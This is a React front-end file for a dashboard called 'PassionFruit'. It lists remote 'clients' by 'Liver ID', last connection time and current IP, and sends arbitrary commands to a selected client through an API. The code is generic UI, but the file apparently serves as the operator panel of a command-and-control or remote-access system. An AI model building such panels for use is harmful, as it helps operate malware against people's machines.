import React, { useState, useEffect } from 'react';
import {
  Container, Box, Typography, Paper, Table, TableBody,
  TableCell, TableContainer, TableHead, TableRow,
  IconButton, useMediaQuery, Button, Skeleton, CircularProgress
} from '@mui/material';
import { LoadingButton } from '@mui/lab';
import { ThemeProvider, createTheme } from '@mui/material/styles';
import CssBaseline from '@mui/material/CssBaseline';
import Brightness4Icon from '@mui/icons-material/Brightness4';
import Brightness7Icon from '@mui/icons-material/Brightness7';
import VisibilityIcon from '@mui/icons-material/Visibility';
import ClientDetails from './components/ClientDetails';
import axios from 'axios';
import { API_BASE_URL } from "./Config.js";

function App() {
  const prefersDarkMode = useMediaQuery('(prefers-color-scheme: dark)');
  const [mode, setMode] = useState(prefersDarkMode ? 'dark' : 'light');
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState(null);
  const [loadingClient, setLoadingClient] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  const theme = React.useMemo(
    () =>
      createTheme({
        palette: {
          mode,
          primary: {
            main: mode === 'dark' ? '#90caf9' : '#1976d2',
          },
          secondary: {
            main: mode === 'dark' ? '#f48fb1' : '#dc004e',
          },
          background: {
            default: mode === 'dark' ? '#121212' : '#fff',
            paper: mode === 'dark' ? '#1e1e1e' : '#fff',
          },
        },
      }),
    [mode],
  );

  const toggleColorMode = () => {
    setMode((prevMode) => (prevMode === 'light' ? 'dark' : 'light'));
  };

  useEffect(() => {
    fetchClients();
  }, []);

  const fetchClients = async () => {
    setIsLoading(true);
    try {
      const response = await axios.get(`${API_BASE_URL}/api/clients`);
      setClients(response.data);
    } catch (error) {
      console.error('Error fetching clients:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const fetchClientDetails = async (clientId) => {
    setLoadingClient(clientId);
    try {
      const response = await axios.get(`${API_BASE_URL}/api/clients/${clientId}`);
      setSelectedClient(response.data);
    } catch (error) {
      console.error('Error fetching client details:', error);
    } finally {
      setLoadingClient(null);
    }
  };

  const handleSendCommand = async (commandData) => {
    try {
      await axios.post(`${API_BASE_URL}/api/commands`, {
        client_id: selectedClient.client_id,
        data: commandData
      });
    } catch (error) {
      console.error('Error sending command:', error);
      throw error;
    }
  };

  const formatDate = (dateStr) => {
    try {
      const utcDate = new Date(dateStr + 'Z');
      if (isNaN(utcDate.getTime())) {
        return 'Invalid Date';
      }
      
      return new Intl.DateTimeFormat('en-GB', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      }).format(utcDate).replace(/\//g, '-');
    } catch (e) {
      console.error('Error formatting date:', e, dateStr);
      return 'Invalid Date';
    }
  };

  const LoadingTable = () => (
    <Box sx={{ width: '100%' }}>
      {[...Array(5)].map((_, index) => (
        <Box key={index} sx={{ display: 'flex', my: 2 }}>
          <Skeleton variant="rectangular" width="25%" height={40} sx={{ mr: 1 }} />
          <Skeleton variant="rectangular" width="25%" height={40} sx={{ mr: 1 }} />
          <Skeleton variant="rectangular" width="25%" height={40} sx={{ mr: 1 }} />
          <Skeleton variant="rectangular" width="20%" height={40} />
        </Box>
      ))}
    </Box>
  );

  return (
    <ThemeProvider theme={theme}>
      <CssBaseline />
      <Container maxWidth="lg">
        <Box sx={{ my: 4 }}>
          <Box sx={{ 
            display: 'flex', 
            alignItems: 'center', 
            justifyContent: 'space-between', 
            mb: 3,
            position: 'relative'
          }}>
            <Typography variant="h4" component="h1" sx={{ flex: 1 }}>
            PassionFruit
            </Typography>
            <Box sx={{ 
              position: 'absolute',
              left: '50%',
              transform: 'translateX(-50%)',
              display: 'flex',
              alignItems: 'center'
            }}>
              <img 
                src="/assets/banner.webp" 
                alt="Banner" 
                style={{ 
                  height: '80px',
                  width: 'auto',
                  marginRight: '16px',
                  borderRadius: '12px'
                }} 
              />
            </Box>
            <Box sx={{ display: 'flex', gap: 2, alignItems: 'center', flex: 1, justifyContent: 'flex-end' }}>
              {selectedClient && (
                <Button variant="outlined" onClick={() => setSelectedClient(null)}>
                  Back to List
                </Button>
              )}
              <IconButton onClick={toggleColorMode} color="inherit">
                {mode === 'dark' ? <Brightness7Icon /> : <Brightness4Icon />}
              </IconButton>
            </Box>
          </Box>

          {!selectedClient ? (
            isLoading ? (
              <Paper sx={{ p: 2 }}>
                <LoadingTable />
              </Paper>
            ) : (
              <TableContainer component={Paper}>
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell>Liver ID</TableCell>
                      <TableCell>Last Connection</TableCell>
                      <TableCell>Current IP</TableCell>
                      <TableCell>Actions</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {clients.length === 0 ? (
                      <TableRow>
                        <TableCell colSpan={4} align="center">
                          <Typography variant="body1" color="text.secondary">
                            No clients found
                          </Typography>
                        </TableCell>
                      </TableRow>
                    ) : (
                      clients.map((client) => (
                        <TableRow key={client.client_id}>
                          <TableCell>{client.client_id}</TableCell>
                          <TableCell>{formatDate(client.last_connection)}</TableCell>
                          <TableCell>{client.current_ip}</TableCell>
                          <TableCell>
                            <LoadingButton
                              loading={loadingClient === client.client_id}
                              loadingPosition="start"
                              startIcon={<VisibilityIcon />}
                              variant="contained"
                              onClick={() => fetchClientDetails(client.client_id)}
                            >
                              View Details
                            </LoadingButton>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </TableContainer>
            )
          ) : (
            <ClientDetails
              client={selectedClient}
              onSendCommand={handleSendCommand}
            />
          )}
        </Box>
      </Container>
    </ThemeProvider>
  );
}

export default App;
